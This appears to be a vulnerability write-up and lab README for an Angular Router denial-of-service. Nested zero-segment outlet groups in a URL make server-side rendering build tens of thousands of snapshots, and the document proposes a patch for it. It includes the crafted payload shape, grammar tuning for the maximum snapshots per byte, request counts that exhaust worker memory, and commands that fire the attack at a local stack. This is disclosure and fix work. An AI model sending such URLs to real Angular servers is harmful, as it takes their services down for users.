# Angular Router zero-segment group replay

Minimal reproduction of an Angular Router out-of-memory failure during
server-side rendering. This file holds the methodology and the numbers behind it.

```text
Candidate: /dashboard/(detail:1//x:/(detail:1//x:/(...)//y:/(...))//y:/(...))   distinct names
Control:   /dashboard/(detail:1//x:/(detail:1//x:/(...)//x:/(...))//x:/(...))   one name
```

Both URLs are 15,349 bytes and declare the same 1,023 parenthesised groups. They
differ only in how many distinct outlet names the siblings of a group carry. Six
candidate requests exhaust a 128 MiB SSR worker. The control answers and the
worker stays up.

The URL pays for each group once. The Router pays for the group count times the
application's fan-out: **13,288 snapshots from one request**.

This is a different root cause from
[#70932](https://github.com/angular/angular/issues/70932). That one is about the
width of the state copied into each snapshot. This is about how many snapshots
get built, and it carries no query parameters and no matrix parameters.

## Where it comes from

`@angular/router` 22.2.0, `fesm2022/_router-chunk.mjs`:

| site                          | line | what                                                                                      |
| ----------------------------- | ---: | ----------------------------------------------------------------------------------------- |
| `processSegmentGroup()`       | 3076 | a zero-segment group goes to `processChildren()` with the same `config` and `parentRoute` |
| `processChildren()`           | 3097 | `children.push(...outletChildren)` — every replay lands in one sibling array              |
| `processChildren()`           | 3100 | `if (typeof ngDevMode === 'undefined' \|\| ngDevMode) checkOutletNameUniqueness(...)`     |
| `checkOutletNameUniqueness()` | 3277 | throws NG04006 unconditionally; only the message sits behind `ngDevMode`                  |
| `UrlParser.parseParens()`     |  590 | children go into a map keyed by outlet name, so same-named siblings overwrite             |
| `UrlParser.parseChildren()`   |  484 | `depth > 50` bounds nesting, not the number of groups                                     |
| `resolveData()`               | 3332 | `concatMap` over the activated routes                                                     |

```js
if (segmentGroup.segments.length === 0 && segmentGroup.hasChildren()) {
  return this.processChildren(injector, config, segmentGroup, parentRoute);
}
```

The group costs no level and creates no node, but its contents are matched
against the same routes again. Out comes a set of siblings sharing one outlet
name, which Angular already treats as fatal, and that check is compiled out of
production.

## The route configuration

```ts
{
  path: 'dashboard',
  component: Dashboard,
  children: [{ path: ':id', outlet: 'detail', component: DetailPanel }],
}
```

`app/src/app/app.routes.ts` holds that and six variations of what the panel
contains, plus the flat shape from "A second way" below:

| shape       | fan-out | the panel holds                            |
| ----------- | ------: | ------------------------------------------ |
| `dashboard` |       1 | nothing                                    |
| `nested`    |       2 | one aside                                  |
| `nested2`   |       4 | an aside with two widgets                  |
| `nested3`   |      13 | three panels, three widgets each           |
| `master`    |      13 | `nested3` plus a primary sibling route     |
| `guarded`   |      13 | `nested3` plus an async `canActivateChild` |
| `resolved`  |       1 | `dashboard` plus a resolver                |

## Automated test

```bash
./scripts/validate.sh dashboard
```

One request against a byte-identical control first, since that part needs no
burst at all. Then a climb from one request up to whatever count takes the worker
past its heap limit. It prints that count instead of asserting a particular one.

Each trial recreates the container, checks the worker's command line for the heap
it was supposed to get, and greps the running worker's copy of the bundle for the
markers the requested build must and must not carry. If the burst never reached
the worker, the trial is refused instead of being written down as a worker that
withstood it. Logs go to `evidence/`.

```bash
./scripts/validate.sh counts     # what recognition builds
./scripts/validate.sh ladder     # what the fan-out is worth
./scripts/validate.sh matrix     # request-line sizes and heaps
./scripts/validate.sh devprod    # development against production
./scripts/validate.sh ablation   # stock against each proof-only edit
./scripts/validate.sh fixcheck   # the two patches, side by side
./scripts/validate.sh resources  # withRouterResources(), the flat variant
./scripts/validate.sh fuzz       # the payload grid
./scripts/validate.sh backend    # what one request does to the service behind it
```

A trial is refused, not reported, when the burst never reached the worker: a 431
on the request line, or requests missing while `/health` answered fast or did not
answer at all. A DNS failure takes seconds, so a slow probe alone is not evidence
the worker was loaded; the probe has to come back 200. Each of these produced a
number here that read as a worker withstanding load.

## What recognition builds

`ROUTER_PATCH=count` instruments `createSnapshot()` and nothing else. One request
at the 8 KiB payload, 511 groups:

| Arm                                 | Bytes |      Nodes |       Tree steps |
| ----------------------------------- | ----: | ---------: | ---------------: |
| `dashboard`, fan-out 1              | 7,671 |      1,024 |          659,205 |
| `nested`, fan-out 2                 | 7,668 |      2,046 |        2,624,000 |
| `nested2`, fan-out 4                | 7,669 |      4,090 |       10,470,405 |
| `nested3`, fan-out 13               | 7,669 | **13,288** | **110,406,675** |
| `master`, fan-out 13 + primary      | 9,201 | **26,574** |      441,460,583 |
| control, byte-identical             | 7,669 |    **236** |       **35,700** |
| no named outlet in the replayed set | 4,092 |      **8** |               15 |

```text
nodes = 2 * groups * matched_per_group * fan_out + 2
```

One request at 7,669 bytes builds 13,288 snapshots and walks 110,406,675 tree
steps. The control is the same length to the byte and builds 236, walking
35,700. That pair is the finding. Everything below is how far it goes.

Exact in every row, with `groups` read per row: 511 for the replayed URLs, and
`depth + 1` for the control, which is the point of the control. `createSnapshot()`
runs twice per match, and the root snapshot is built directly
(`_router-chunk.mjs:3056`) rather than through it, so the retained tree is half of
the count plus one.

Seven is not a correct number either — the control's `depth + 1`. A legitimate
URL declares one group and activates one route. The smallest misbehaving case is
`/dashboard/(detail:1//x:/(detail:1))`, which activates one route twice and which
development rejects with NG04006. There is no safe number of nested groups.

The last row is the precondition: with no named outlet in the replayed set,
`parseParens()` unwraps the single primary child and four nodes are built.

## Requests to OOM

```bash
./scripts/validate.sh matrix
```

Lowest concurrency that takes the worker past its heap limit, climbing from 1,
fresh worker per trial, `OOMKilled=false` on every kill. All six cells come from
one run, straight at the worker, two dedicated cores each, no proxy. The 8 KB
worker at 512 MiB survived forty requests and I stopped the climb there, so that
cell is a floor and not a count.

|   Path bytes | 128 MiB | 256 MiB |  512 MiB |
| -----------: | ------: | ------: | -------: |
|      7,669 B |  **10** |  **20** | **> 40** |
|     15,349 B |   **6** |  **10** |   **20** |

At 128 MiB the 8 KB payload gets there for less traffic, 77 KB against 92 KB. At
512 MiB the two land within a few KB of each other. Neither size wins across the
range.

An async `canActivateChild` lowers the floor by a request or two. It is not what
makes this fatal. Those numbers came from an earlier run on a different CPU
regime, so they are not in the grid above.

Counts move by a request or two between runs, here and below. Fatality is also
not monotone in the request count: 16 KiB against a 128 MiB worker is fatal at 6
and at 8, and healthy at 16 and at 64. A big enough burst stops arriving together
and gets recognised one request at a time. So each cell is the lowest count that
killed the worker on a climb from 1, not a line above which it always dies.

More memory does not halve the exposure, and every count here is small enough
that no rate limit tells the burst from ordinary traffic. Heaps above 512 MiB
were not measured.

The fan-out belongs to the application and costs the attacker nothing: on the
same 15,349-byte request, a bare panel builds 2,048 nodes where three panels of
three widgets build 26,600.

## A second way to the same missing check

The gate at `:3100` is not only reachable through the replay. A flat URL of
distinct outlet names reaches it too, because `processSegmentAgainstRoute()`
(`:3123`) lets an empty-path route in the primary outlet match every named
outlet the URL declares. That inflation is
[#70932](https://github.com/angular/angular/issues/70932)'s, not this one's.

```ts
{ path: '', component: Shell, children: [        // <router-outlet name="side" />
    { path: ':id', component: Report, resources: threeResources },
    { path: '', outlet: 'side', component: Panel },
] }
```

```text
/(a:1//b:1//c:1//...)
```

With `withRouterResources()` enabled, each duplicated instance costs one factory
and its loaders. Three resources on 300 ms timers. Loaders that resolve
immediately kill nothing, so the wait is what makes this cost.

```bash
./scripts/validate.sh resources
```

|   Path bytes | Outlets |    Heap | Requests | stock      | #70933 applied |
| -----------: | ------: | ------: | -------: | ---------- | -------------- |
|      7,995 B |   1,246 | 256 MiB |        5 | **V8 OOM** | **V8 OOM**     |
|     16,073 B |   2,400 | 256 MiB |        3 | **V8 OOM** | **V8 OOM**     |
|      7,995 B |   1,246 | 512 MiB |       12 | **V8 OOM** | **V8 OOM**     |
|     16,073 B |   2,400 | 512 MiB |        8 | **V8 OOM** | **V8 OOM**     |

`withRouterResources()` is developer preview and opt-in, so an application that
has not enabled it is outside this.

The point of the variant is where the check has to go. Ungating `:3100` does
**not** close it: `checkOutletNameUniqueness` already runs after
`mergeEmptyPathMatches`, but only over the merged siblings, and the duplicates
the merge produces sit among the children it moves under one of them. Checking
those recursively closes both. That is what `zero-segment-replay.patch` does.

## Only in production

`@angular/build` replaces `ngDevMode` with `false` in an optimized build, so
`checkOutletNameUniqueness` is tree-shaken out of the server bundle that ships.

```bash
./scripts/validate.sh devprod
```

Same application, same URL, same heap, four requests:

| Build         | `checkOutletNameUniqueness` |  Status |
| ------------- | --------------------------- | ------: |
| `development` | present                     | **404** |
| `production`  | tree-shaken                 |     302 |

In development the application is protected. Nothing run locally, and no unit
test, shows this.

Grepping for the identifier proves nothing, since minification renames it either
way. NG04006's numeric code survives, and 4006 appears only in that function's
throw: once in the development bundle, never in the optimized one. It is gone by
position too — in the minified `processChildren`, `mergeEmptyPathMatches` is
followed straight by `sortActivatedRouteSnapshots`, with nothing in between.

## What the budget buys

```bash
node client/fuzz.mjs            # the grid, offline
./scripts/validate.sh fuzz      # measured
```

Two free choices. A primary sibling, where the application has a primary child
route beside the named one, makes `1//detail:1` match two routes per group for 3
bytes. And `)` already ends a group, so the `//` between sibling wrappers is
optional; the one before the first wrapper is not, since `detail:1x:` reads as
outlet `detail` carrying the segment `1x`.

At a 15,900-byte budget against a fan-out of 13:

| grammar                   | b, d  | groups |  bytes |      nodes |
| ------------------------- | ----- | -----: | -----: | ---------: |
| `detail:1`, separators    | 32, 2 |  1,057 | 15,853 |     27,484 |
| `detail:1`, none          | 34, 2 |  1,191 | 15,553 |     30,968 |
| `1//detail:1`, separators | 29, 2 |    871 | 15,676 |     45,294 |
| `1//detail:1`, none       | 30, 2 |    931 | 14,958 | **48,414** |

The third term is the application's own outlet name, repeated in every group, and
the attacker cannot change it: `a` fits 1,407 groups into the same budget where
`sidePanel` fits 820.

Depth is nearly irrelevant. The optimum is `d=2`, and the parser's `depth > 50`
guard is never in play. What decides is how many groups fit.

## The service behind the worker

`backend/server.mjs` answers after `BACKEND_MS`, 250 by default, and counts
queries. `/resolved` is the four-line configuration with a resolver on it.

```bash
./scripts/validate.sh backend
```

One request, fan-out 1, so every query is one replayed group:

|       Path bytes | Groups | Queries | Worker slot held | Peak in flight |
| ---------------: | -----: | ------: | ---------------: | -------------: |
|            230 B |     15 |  **15** |         3,924 ms |              1 |
|            950 B |     63 |  **63** |        15,994 ms |              1 |
|          1,910 B |    127 | **127** |        32,069 ms |              1 |
| 1,910 B, control |    127 |   **7** |         1,927 ms |              1 |

Queries equal groups at every size. Peak in flight is 1, which is
`resolveData()`'s `concatMap` measured rather than asserted — and it bounds the
rate as well as the count: 127 queries over 32 s is about 4 per second, so one
request does not bury anything. The amplification is 18x the control's 7, and it
is per request; the load scales with concurrency.

What one request does buy reliably is the worker slot and the connection, held
for those 32 seconds while `/health` still answers 200. What reaches the service
comes from the SSR tier's own address with its own credentials and carries
nothing attacker-controlled, and the client gets a 302 with a 20-byte
`Location`, so nothing ties the queries back to the request that caused them —
though the 1,910-byte URI and the 32-second response are both logged. Only
`resolve` was measured.

## The two patches

Each one is here twice: as a diff against `angular/angular`, and as a script
that makes the same edit to the published bundle. The diff is what you send a
maintainer. The script is what lets this lab build an image in minutes instead
of compiling Angular from source.

| | source diff | bundle script | switch |
| --- | --- | --- | --- |
| [#70933](https://github.com/angular/angular/pull/70933) | `70933.patch` | `app/patch-70933.mjs` | `PATCH_70933=1` |
| the fix for this | `zero-segment-replay.patch` | `app/patch-zero-segment.mjs` | `PATCH_ZERO_SEGMENT=1` |

Neither needs the other. They touch different functions, so you can apply one,
both, or neither, in whatever order. Each script also takes `revert` and
`status`, so you can move a bundle between states without reinstalling it. Both
diffs apply cleanly to the commit #70933 is based on.

```bash
npm --prefix app run build:70933          # or build:zero-segment, build:both, build:stock
PATCH_ZERO_SEGMENT=1 docker compose up -d --build --wait app
./scripts/validate.sh fixcheck            # the two, side by side, plus a regression check
```

#70933 does not close this. It shares one frozen query map across snapshots and
stops copying inherited params into each one. This attack carries no query
parameters and no matrix parameters, so there is nothing for it to share.

The fix is three edits:

1. The gated call site in `processChildren` goes away.
2. The check moves onto every list `mergeEmptyPathMatches` returns. That
   function recurses into the children it merges, so this is the only way to
   reach the duplicates the merge itself creates.
3. The map of seen names becomes `Object.create(null)`.

The third looks cosmetic and is not. An outlet can legitimately be called
`constructor` or `toString`, and with a plain object a single outlet by that
name reads back an inherited value and gets rejected as a duplicate of itself.
Nobody hits that today, because the check does not run in production. The moment
it does, it matters.

## Isolating it

Two more edits to `@angular/router`, applied at build time. These are ablations,
not proposals: `count` instruments `createSnapshot()` and the tree walk, and
`ungate` calls the check at the site it already has. `ungate` closes the nested
replay but leaves the flat variant open, which is why the fix moves the call
instead.

```bash
ROUTER_PATCH=ungate docker compose up -d --build --wait app
./scripts/validate.sh ablation
```

`nested3`, 15,349 bytes, four concurrent requests, 256 MiB:

| Build    |   Peak RSS | Status |
| -------- | ---------: | -----: |
| stock    |    296 MiB |    302 |
| #70933   |    273 MiB |    302 |
| `ungate` | **73 MiB** |    404 |

273 against 296 is inside the spread between runs, so #70933 moves nothing here.
Ungating drops memory to the worker's idle footprint: recognition throws on the
first duplicated sibling and the tree never gets built. The throw still happens
after the provisional snapshots exist, so it bounds what the tree keeps, not
everything recognition allocates.

## Does the fix hold

```bash
HEAP_MB=512 CONCURRENCY=24 ./scripts/validate.sh fixcheck
```

24 concurrent requests at 15,349 bytes against a 512 MiB worker, which is above
the 20 that kill it unpatched:

| Build          | Attack     |   Peak RSS |  /health | Ordinary URL             |
| -------------- | ---------- | ---------: | -------: | ------------------------ |
| stock          | **V8 OOM** |    713 MiB | 132278ms | 200, sha 4c8b46439352a579 |
| `zero-segment` | **404**    | **142 MiB** |  **194ms** | 200, sha 4c8b46439352a579 |

Same sha on both, so the page a real user asks for renders byte for byte the
same. That is the question worth asking first, and the answer is that the fix
does not move it.

Then the same worker at counts well past the floor, all of them 404, every
request delivered, worker alive:

| Path bytes | x24 | x32 | x48 | x64 |
| ---------: | --- | --- | --- | --- |
|    7,669 B | ok  | ok  | ok  | ok  |
|   15,349 B | ok  | ok  | ok  | ok  |

`/health` stays under 800 ms at 64 concurrent, against 132 seconds for stock at
24. Recognition throws on the first duplicated sibling, so the tree is never
built and there is nothing to collect.

## Manual test

The candidate intentionally takes down the SSR worker. Use only this disposable
local stack.

```bash
HEAP_MB=128 SHAPE=nested3 docker compose up -d --wait app
HEAP_MB=128 SHAPE=nested3 BRANCHES=2 DEPTH=9 CONCURRENCY=8 \
  docker compose --profile test run --rm candidate
docker compose logs app | grep -E 'Reached heap limit|JavaScript heap out of memory'
docker inspect "$(docker compose ps -a -q app)" --format '{{.State.OOMKilled}}'
```

Expected: a V8 heap error and `false`. Swap `candidate` for `control` to send the
byte-identical request with one wrapper name instead of many; it is not harmless,
only much cheaper. `SHAPE` picks the configuration, `BRANCHES` and `DEPTH` size
the URL, `PRIM=1` adds the primary sibling, `NO_SEP=1` drops the separator and
`OUTLET` matches the application's outlet name.

`scripts/lanes.sh` runs whole cells in parallel and `scripts/sweep.sh` runs one
cell's concurrencies, a Compose project and a physical core each. Both take a
lock: one measurement run at a time.

## Where this stops

It needs SSR and a route with a named outlet reachable under a path. That is the
whole list. The first segment has to match a declared route, which `/dashboard`
does; everything after it is the attacker's to write. Taking the lab's
`{ path: '**' }` out changes nothing, and in any case almost every Angular
application declares one for its 404 page.

The fan-out is the application's choice and the dominant multiplier, so an
application whose named outlet holds nothing is not worth attacking this way.

Recognition finishes. This is not a permanent spin.

## Clean up

```bash
docker compose down -v --remove-orphans
```

## Environment

```text
Node.js:     24.16.0 in the image
Angular:     22.2.0 production AOT (@angular/router and @angular/ssr 22.2.0)
SSR engine:  AngularNodeAppEngine + Express 5.1.0
Docker:      29.7.2, Compose v5.5.0
Host:        Windows 11, Docker Desktop, i7 with 8 physical cores
```
